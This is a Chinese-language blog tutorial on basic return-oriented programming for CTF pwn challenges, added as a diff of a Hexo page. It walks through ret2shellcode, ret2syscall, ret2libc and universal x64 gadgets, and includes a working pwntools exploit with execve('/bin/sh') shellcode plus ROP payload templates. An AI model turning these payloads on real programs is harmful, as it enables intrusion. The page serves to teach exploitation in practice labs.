@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        基本ROP - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-shellcode的使用"><span class="toc-text">0x01 shellcode的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example1"><span class="toc-text">Example1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-控制程序执行系统调用"><span class="toc-text">0x02 控制程序执行系统调用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#控制函数执行libc中的函数"><span class="toc-text">控制函数执行libc中的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一种情况-system函数的位置已知"><span class="toc-text">第一种情况(system函数的位置已知)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二种情况-system、gets函数的位置已知"><span class="toc-text">第二种情况(system、gets函数的位置已知)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三种情况-system函数的位置未知"><span class="toc-text">第三种情况(system函数的位置未知)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一些特殊的gadgets"><span class="toc-text">一些特殊的gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、"><span class="toc-text">一、</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、"><span class="toc-text">二、</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        基本ROP
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-11-06 21:41:24</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>pwn！pwn！pwn！</p>
+<a id="more"></a>
+<h1 id="0x01-shellcode的使用"><a href="#0x01-shellcode的使用" class="headerlink" title="0x01 shellcode的使用"></a>0x01 shellcode的使用</h1><ul>
+<li>当pwn程序中没有执行系统命令的函数的时候，我们就需要自己写一个shellcode，目的是执行系统命令“/bin/sh”</li>
+</ul>
+<h3 id="Example1"><a href="#Example1" class="headerlink" title="Example1"></a>Example1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>该程序很简单，什么保护也没有开启，通过阅读伪C代码可以明显的看出存在gets栈溢出漏洞，之后还将输入的内容拷贝进了在.bss段上的buf2中，那么我们来调试一下.bss段上是否可执行代码</p>
+</li>
+<li><p>在GDB中运行该程序，输入vmmap即可显示该程序中某一地址处的权限</p>
+</li>
+</ul>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start      End        Perm	Name</span><br><span class="line"><span class="number">0x08048000</span> <span class="number">0x08049000</span> r-xp	/root/pwn/wiki/ret2shellcode</span><br><span class="line"><span class="number">0x08049000</span> <span class="number">0x0804a000</span> r-xp	/root/pwn/wiki/ret2shellcode</span><br><span class="line"><span class="number">0x0804a000</span> <span class="number">0x0804b000</span> rwxp	/root/pwn/wiki/ret2shellcode</span><br><span class="line"><span class="number">0xf7e03000</span> <span class="number">0xf7e04000</span> rwxp	mapped</span><br><span class="line"><span class="number">0xf7e04000</span> <span class="number">0xf7fb1000</span> r-xp	/lib32/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0xf7fb1000</span> <span class="number">0xf7fb2000</span> ---p	/lib32/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0xf7fb2000</span> <span class="number">0xf7fb4000</span> r-xp	/lib32/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0xf7fb4000</span> <span class="number">0xf7fb5000</span> rwxp	/lib32/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0xf7fb5000</span> <span class="number">0xf7fb8000</span> rwxp	mapped</span><br><span class="line"><span class="number">0xf7fd4000</span> <span class="number">0xf7fd5000</span> rwxp	mapped</span><br><span class="line"><span class="number">0xf7fd5000</span> <span class="number">0xf7fd8000</span> r--p	[vvar]</span><br><span class="line"><span class="number">0xf7fd8000</span> <span class="number">0xf7fda000</span> r-xp	[vdso]</span><br><span class="line"><span class="number">0xf7fda000</span> <span class="number">0xf7ffc000</span> r-xp	/lib32/ld<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0xf7ffc000</span> <span class="number">0xf7ffd000</span> r-xp	/lib32/ld<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0xf7ffd000</span> <span class="number">0xf7ffe000</span> rwxp	/lib32/ld<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0xfffdd000</span> <span class="number">0xffffe000</span> rwxp	[stack]</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>buf2在0x0804A080,通过在GDB中可以看到0x0804a000的权限是RWX，可读可写可执行，这就很完美了</li>
+<li>接下来就是构造payload了<ul>
+<li>输入的字符串含有shellcode，这样shellcode在内存中的地址就是buf2的起始地址</li>
+<li>通过栈溢出把主函数的返回值覆盖成buf2的起始位置，这样我们输入的shellcode就得到执行</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>exp：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process("./ret2shellcode")</span><br><span class="line">bss_addr = 0x804a080</span><br><span class="line">shellcode = "<span class="symbol">\x</span>31<span class="symbol">\x</span>c9<span class="symbol">\x</span>f7<span class="symbol">\x</span>e1<span class="symbol">\x</span>51<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>cd<span class="symbol">\x</span>80"</span><br><span class="line"></span><br><span class="line">payload = shellcode + "a"*(112-len(shellcode))+p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-控制程序执行系统调用"><a href="#0x02-控制程序执行系统调用" class="headerlink" title="0x02 控制程序执行系统调用"></a>0x02 控制程序执行系统调用</h1><ul>
+<li>由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用</li>
+<li>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</li>
+</ul>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">execve</span><span class="params">(<span class="string">"/bin/sh"</span>,NULL,NULL)</span></span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其中，该程序是 32 位，所以我们需要使得<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+</li>
+<li>这里我们用gadgets来控制寄存器的值，具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具</li>
+<li>寻找汇编指令</li>
+</ul>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@wxm-virtual-machine:~<span class="regexp">/pwn/</span>wiki# ROPgadget --binary rop  --only <span class="string">'pop|ret'</span> | <span class="keyword">grep</span> <span class="string">'eax'</span></span><br><span class="line"><span class="number">0</span>x0809ddda : <span class="keyword">pop</span> eax ; <span class="keyword">pop</span> ebx ; <span class="keyword">pop</span> esi ; <span class="keyword">pop</span> edi ; ret</span><br><span class="line"><span class="number">0</span>x080bb196 : <span class="keyword">pop</span> eax ; ret</span><br><span class="line"><span class="number">0</span>x0807217a : <span class="keyword">pop</span> eax ; ret <span class="number">0</span>x80e</span><br><span class="line"><span class="number">0</span>x0804f704 : <span class="keyword">pop</span> eax ; ret <span class="number">3</span></span><br><span class="line"><span class="number">0</span>x0809ddd9 : <span class="keyword">pop</span> es ; <span class="keyword">pop</span> eax ; <span class="keyword">pop</span> ebx ; <span class="keyword">pop</span> esi ; <span class="keyword">pop</span> edi ; ret</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>寻找“int”</li>
+</ul>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget </span><span class="built_in">--binary</span> <span class="string">rop </span> <span class="built_in">--only</span> <span class="string">'int'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>寻找字符串</li>
+</ul>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --<span class="built_in">binary</span> rop  --<span class="built_in">string</span> <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>构造ROP</li>
+</ul>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">payload</span> =<span class="string">"a"</span>*n + <span class="keyword">pop_eax_ret_addr </span>+ <span class="number">0xb</span> + <span class="keyword">pop_edx_ecx_ebx_ret </span>+ <span class="number">0</span> + <span class="number">0</span> + <span class="keyword">binsh </span>+ int_<span class="number">0x80</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="控制函数执行libc中的函数"><a href="#控制函数执行libc中的函数" class="headerlink" title="控制函数执行libc中的函数"></a>控制函数执行libc中的函数</h1><ul>
+<li>想要更好的理解这里，那么就得先学会动态链接的、plt/got表，这里不再详细的解释，回头特别总结一下</li>
+</ul>
+<hr>
+<ul>
+<li>要想控制函数执行libc中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)</li>
+<li>执行libc中的函数分为两种，第一种是已知我们需要的函数在got表中的位置，第二种则是不知道我们需要的函数在got表中的值</li>
+</ul>
+<h3 id="第一种情况-system函数的位置已知"><a href="#第一种情况-system函数的位置已知" class="headerlink" title="第一种情况(system函数的位置已知)"></a>第一种情况(system函数的位置已知)</h3><ul>
+<li>存在_system函数，并且存在“/bin/sh”字符串</li>
+<li>payload构造方法:</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">payload</span> = <span class="string">"a"</span>*n+system_plt_addr + [system_ret_addr]/<span class="string">"a"</span>*<span class="number">4</span> +  binsh_addr</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这种构造方法仅限于32位的ELF可执行文件，64位的程序给函数传递参数的方式与32位的不一样</li>
+</ul>
+<h3 id="第二种情况-system、gets函数的位置已知"><a href="#第二种情况-system、gets函数的位置已知" class="headerlink" title="第二种情况(system、gets函数的位置已知)"></a>第二种情况(system、gets函数的位置已知)</h3><ul>
+<li>存在 _system，但是没有“/bin/sh”字符串，那么这个时候我们就要自己想办法来输入一个字符串为“/bin/sh”，那么我们就有用到了 _gets 函数</li>
+<li>payload构造方法:</li>
+</ul>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">buf是一个全局变量</span></span><br><span class="line"><span class="keyword">payload </span>= <span class="string">"a"</span>*n + _gets_plt_addr + <span class="keyword">pop_eax_ret_addr </span>+ <span class="keyword">buf2 </span>+ system_plt_addr + [system_ret_addr]/<span class="string">"a"</span>*<span class="number">4</span> +  <span class="keyword">binsh_addr</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我在看这里的时候有踩过坑，就是不知道为什么要用到pop_ eax_ ret，然后请教大佬，才明白，当我们调用过gets函数的时候，我们输入的字符串还在栈上，那么我们用pop_eax来把这个字符串给取出来，然后ret到system的地址上，从而执行了shell</li>
+</ul>
+<h3 id="第三种情况-system函数的位置未知"><a href="#第三种情况-system函数的位置未知" class="headerlink" title="第三种情况(system函数的位置未知)"></a>第三种情况(system函数的位置未知)</h3><ul>
+<li>这种情况下，我们就要通过 libc.so(动态链接库)来获取我们想要的函数的真是地址</li>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>关系：</li>
+</ul>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line"><span class="function"><span class="title">plt</span>中存放着got位置--&gt;</span>got中存放着函数的位置</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其次是题目有无提供的libc.so文件，如果题目提供了的话，可以用以下方法：<ul>
+<li>got表中存放的函数位置是已经偏移过的函数库中的位置</li>
+<li>libc基地址 = got中存放的地址 - libc.so 文件中的相对应的函数的位置</li>
+<li>system_addr = 基地址 + system在so文件中的地址</li>
+</ul>
+</li>
+<li>如果题目没有提供libc.so文件，那么我们就要通过泄露地址来获取我们想要的函数的地址，方法有<ul>
+<li>通过searchlibc这个工具来查找；(这种方法由于自己能力原因，没有调试好工具，所以也没能够实现)</li>
+<li>通过pwntools中的DynELF方法来泄露libc中的地址;(这种方法会在后面具体描述，此处不再作过多解释)</li>
+</ul>
+</li>
+</ul>
+<h1 id="一些特殊的gadgets"><a href="#一些特殊的gadgets" class="headerlink" title="一些特殊的gadgets"></a>一些特殊的gadgets</h1><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><ul>
+<li>第一个gadget经常被称作通用gadgets，通常位于x64的ELF程序中的__libc_csu_init中</li>
+</ul>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400840</span>                 <span class="meta">public</span> __libc_csu_init</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400840</span> __libc_csu_init proc <span class="built_in">near</span>               <span class="comment">; DATA XREF: _start+16↑o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400840</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400840</span>                 <span class="keyword">push</span>    <span class="built_in">r15</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400842</span>                 <span class="keyword">mov</span>     <span class="built_in">r15d</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400845</span>                 <span class="keyword">push</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400847</span>                 <span class="keyword">mov</span>     <span class="built_in">r14</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040084A                 <span class="keyword">push</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040084C                 <span class="keyword">mov</span>     <span class="built_in">r13</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040084F                 <span class="keyword">push</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400851</span>                 <span class="keyword">lea</span>     <span class="built_in">r12</span>, __frame_dummy_init_array_entry</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400858</span>                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400859</span>                 <span class="keyword">lea</span>     <span class="built_in">rbp</span>, __do_global_dtors_aux_fini_array_entry</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400860</span>                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400861</span>                 <span class="keyword">sub</span>     <span class="built_in">rbp</span>, <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400864</span>                 <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400866</span>                 <span class="keyword">sar</span>     <span class="built_in">rbp</span>, <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040086A                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040086E                 <span class="keyword">call</span>    _init_proc</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400873</span>                 <span class="keyword">test</span>    <span class="built_in">rbp</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400876</span>                 <span class="keyword">jz</span>      short loc_400896</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400878</span>                 <span class="keyword">nop</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400880</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400880</span> loc_400880:                             <span class="comment">; CODE XREF: __libc_csu_init+54↓j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400880</span>                 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400883</span>                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400886</span>                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">r15d</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400889</span>                 <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r12</span>+<span class="built_in">rbx</span>*<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040088D</span>                 <span class="keyword">add</span>     <span class="built_in">rbx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400891</span>                 <span class="keyword">cmp</span>     <span class="built_in">rbx</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400894</span>                 <span class="keyword">jnz</span>     short loc_400880</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400896</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400896</span> loc_400896:                             <span class="comment">; CODE XREF: __libc_csu_init+36↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400896</span>                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040089A                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040089B                 <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040089C                 <span class="keyword">pop</span>     <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040089E                 <span class="keyword">pop</span>     <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004008A0                 <span class="keyword">pop</span>     <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004008A2                 <span class="keyword">pop</span>     <span class="built_in">r15</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004008A4                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004008A4 <span class="comment">; &#125; // starts at 400840</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004008A4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>从这个函数中我们可以发现两个gadget，</li>
+</ul>
+<ol>
+<li><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> <span class="built_in">rbx</span><span class="comment">; </span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rbp</span><span class="comment">; </span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">r12</span><span class="comment">; </span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">r13</span><span class="comment">; </span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">r14</span><span class="comment">; </span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">r15</span><span class="comment">; </span></span><br><span class="line"><span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
+</li>
+<li></li>
+</ol>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">r13</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">r14</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">r15d</span></span><br><span class="line"><span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r12</span>+<span class="built_in">rbx</span>*<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
+
+<p>3.</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这个我做一个解释，这两天指令并不是在这个函数里面直接有的，而是通过pop r15,retn;转变过来的，我们可以通过IDA中D快捷键把指令变成机器码，再让后两个结合成为一条指令，然后就变成了第三个的指令啦</li>
+</ul>
+<p><strong>我们知道64位程序通过参数来进行转参的，通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈</strong></p>
+<html>
+<p>
+以上三个gadgets中，第一个可以设置r12-r15，接上第三个使用已经设置的寄存器设置rdi, 接上第二段设置rsi, rdx, rbx，最后利用r12+rbx*8可以call任意一个地址。</p>
+<p>
+<b>需要注意的是</b>，用万能gadgets的时候需要设置rbp=1，因为call qword ptr [r12+rbx*8]之后是add rbx, 1; cmp rbx, rbp; jnz xxxxxx。由于我们通常使rbx=0，从而使r12+rbx*8 = r12，所以call指令结束后rbx必然会变成1。若此时rbp != 1，jnz会再次进行call，从而可能引起段错误</p>
+</html>
+
+<h3 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h3><ul>
+<li>第二种方法被称为one gadget RCE</li>
+<li>条件：<ul>
+<li>需要一个对应环境的libc</li>
+<li><a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a></li>
+</ul>
+</li>
+</ul>
+<p><strong>用法：</strong></p>
+<ul>
+<li>首先要泄露出一个函数在got中的偏移过后的地址，然后计算出偏移地址</li>
+<li>然后通过one_gadget工具进行查找</li>
+</ul>
